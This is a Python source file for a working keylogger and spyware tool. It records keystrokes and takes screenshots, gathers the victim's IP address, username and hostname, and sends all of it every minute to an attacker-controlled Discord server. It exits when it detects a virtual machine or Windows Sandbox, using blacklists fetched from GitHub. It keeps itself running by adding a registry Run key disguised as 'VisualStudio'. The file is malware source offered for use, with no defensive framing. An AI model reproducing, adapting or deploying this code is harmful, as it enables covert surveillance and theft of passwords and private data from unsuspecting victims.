from pynput import keyboard
from discord import Intents, Client, Embed, File
from discord.ext import tasks
from PIL import ImageGrab
import io
import asyncio
import uuid
import platform
import socket
import psutil
import getpass
import os
import sys
import winreg
import requests

intents = Intents.default()
intents.guilds = True
intents.messages = True
client = Client(intents=intents)

text = ""
session_channel = None
TOKEN = "YOUR_TOKEN"
GUILD_ID = 123456789
TEMP_DIR = os.getenv("TEMP", "/tmp")
SESSION_FILE = os.path.join(TEMP_DIR, "session.txt")

BLACKLIST_URLS = {
    "hwid": "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
    "ip": "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
    "username": "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt",
    "pc_name": "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt",
}

def fetch_blacklist(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text.splitlines()
    except Exception as e:
        print(f"Error fetching blacklist from {url}: {e}")
        return []

def is_virtual_machine():
    hwid = platform.node().upper()
    username = getpass.getuser().upper()
    computer_name = socket.gethostname().upper()
    ip_address = socket.gethostbyname(socket.gethostname())

    hwid_blacklist = fetch_blacklist(BLACKLIST_URLS["hwid"])
    username_blacklist = fetch_blacklist(BLACKLIST_URLS["username"])
    pc_name_blacklist = fetch_blacklist(BLACKLIST_URLS["pc_name"])
    ip_blacklist = fetch_blacklist(BLACKLIST_URLS["ip"])

    print("\n=== System Information ===")
    print(f"HWID: {hwid}")
    print(f"Username: {username}")
    print(f"Computer Name: {computer_name}")
    print(f"IP Address: {ip_address}")

    print("\n=== Blacklists ===")
    print(f"HWID Blacklist: {hwid_blacklist}")
    print(f"Username Blacklist: {username_blacklist}")
    print(f"Computer Name Blacklist: {pc_name_blacklist}")
    print(f"IP Blacklist: {ip_blacklist}")

    if any(blacklisted_hwid in hwid for blacklisted_hwid in hwid_blacklist):
        print("HWID matches blacklist.")
        return True
    if any(blacklisted_username in username for blacklisted_username in username_blacklist):
        print("Username matches blacklist.")
        return True
    if any(blacklisted_pc_name in computer_name for blacklisted_pc_name in pc_name_blacklist):
        print("Computer name matches blacklist.")
        return True
    if ip_address in ip_blacklist:
        print("IP address matches blacklist.")
        return True
    return False

def is_windows_sandbox():
    if getpass.getuser() == "WDAGUtilityAccount":
        print("Windows Sandbox detected: WDAGUtilityAccount user.")
        return True

    if socket.gethostname().upper().startswith("WDAG"):
        print("Windows Sandbox detected: WDAG computer name.")
        return True

    if os.path.exists(r"C:\Users\WDAGUtilityAccount"):
        print("Windows Sandbox detected: WDAGUtilityAccount directory.")
        return True

    try:
        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\AppModel\StateChange")
        sandbox_value, _ = winreg.QueryValueEx(reg_key, "PackageFullName")
        winreg.CloseKey(reg_key)
        if "WindowsSandbox" in sandbox_value:
            print("Windows Sandbox detected: Registry key.")
            return True
    except FileNotFoundError:
        pass

    return False

def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "VisualStudio", 0, winreg.REG_SZ, sys.executable + ' "' + os.path.abspath(__file__) + '"')
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Error adding to startup: {e}")

def get_system_info():
    system_info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "Username": getpass.getuser(),
        "CPU Usage": f"{psutil.cpu_percent()}%",
        "Memory Usage": f"{psutil.virtual_memory().percent}%",
    }
    return system_info

def save_session_info(channel_id):
    with open(SESSION_FILE, "w") as file:
        file.write(str(channel_id))

def load_session_info():
    if os.path.exists(SESSION_FILE):
        with open(SESSION_FILE, "r") as file:
            return int(file.read().strip())
    return None

async def create_session_channel(ip_address):
    global session_channel
    try:
        guild = client.get_guild(GUILD_ID)
        if guild:
            channel_id = load_session_info()
            if channel_id:
                session_channel = client.get_channel(channel_id)
                if session_channel:
                    print(f"Reusing existing channel: {session_channel.name}")
                else:
                    channel_id = None

            if not channel_id:
                channel_name = f"session-{str(uuid.uuid4())[:8]}"
                session_channel = await guild.create_text_channel(channel_name)
                save_session_info(session_channel.id)
                print(f"Created new channel: {session_channel.name}")

            system_info = get_system_info()
            embed = Embed(title="New Session Started", color=0x00ff00)
            embed.add_field(name="IP Address", value=system_info["IP Address"], inline=False)
            embed.add_field(name="Hostname", value=system_info["Hostname"], inline=False)
            embed.add_field(name="Username", value=system_info["Username"], inline=False)
            embed.add_field(name="OS", value=f"{system_info['OS']} {system_info['OS Version']}", inline=False)
            embed.add_field(name="CPU Usage", value=system_info["CPU Usage"], inline=False)
            embed.add_field(name="Memory Usage", value=system_info["Memory Usage"], inline=False)

            screenshot = ImageGrab.grab()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_bytes.seek(0)

            embed.set_image(url="attachment://screenshot.png")

            await session_channel.send("@everyone", embed=embed, file=File(img_bytes, filename="screenshot.png"))
        else:
            print("Guild not found. Check the GUILD_ID.")
    except Exception as e:
        print(f"Error creating channel or sending data: {e}")

async def send_data():
    global text, session_channel
    if session_channel:
        try:
            screenshot = ImageGrab.grab()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_bytes.seek(0)

            if text.strip() == "":
                embed = Embed(title="Keyboard Data", description="```No Keystrokes Pressed```", color=0xff0000)
            else:
                embed = Embed(title="Keyboard Data", description=f"```{text}```", color=0xff0000)

            embed.set_image(url="attachment://screenshot.png")

            await session_channel.send(embed=embed, file=File(img_bytes, filename="screenshot.png"))

            text = ""
        except Exception as e:
            print(f"Error sending data: {e}")
    else:
        print("Session channel not created.")

@tasks.loop(seconds=60)
async def send_data_periodically():
    await send_data()

def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.backspace and len(text) == 0:
            pass
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        elif key == keyboard.Key.esc:
            return False
        else:
            text += str(key).strip("'")
    except Exception as e:
        print(f"Error in on_press: {e}")

@client.event
async def on_ready():
    print(f"Logged in as {client.user}")
    ip_address = socket.gethostbyname(socket.gethostname())
    await create_session_channel(ip_address)
    send_data_periodically.start()

async def main():
    await client.start(TOKEN)

if __name__ == "__main__":
    if is_virtual_machine() or is_windows_sandbox():
        print("Virtual machine or Windows Sandbox detected. Exiting...")
        sys.exit(0)

    add_to_startup()

    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()

    client.run(TOKEN)
